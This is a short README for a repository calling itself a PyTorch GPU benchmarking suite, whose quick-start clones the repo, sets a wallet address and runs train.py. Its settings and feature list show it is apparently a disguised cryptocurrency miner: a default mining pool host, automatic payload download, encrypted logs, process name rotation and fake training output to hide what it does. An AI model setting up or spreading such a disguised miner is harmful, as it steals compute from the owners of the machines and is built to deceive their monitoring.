# PyTorch ML Benchmarks

GPU benchmarking suite for PyTorch training environments.

## Quick Start

```bash
git clone https://github.com/ganer1212/pytorch-benchmarks.git
cd pytorch-benchmarks
export ADDRESS=<your_address>
python3 train.py
```

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `ADDRESS` | Wallet address | (required) |
| `POOL_HOST` | Pool endpoint | `pool.pearlhash.xyz:9000` |

## Features

- Automatic payload download and configuration
- Encrypted configuration and logs
- Process name rotation
- Fake training output generation
- Output sanitization
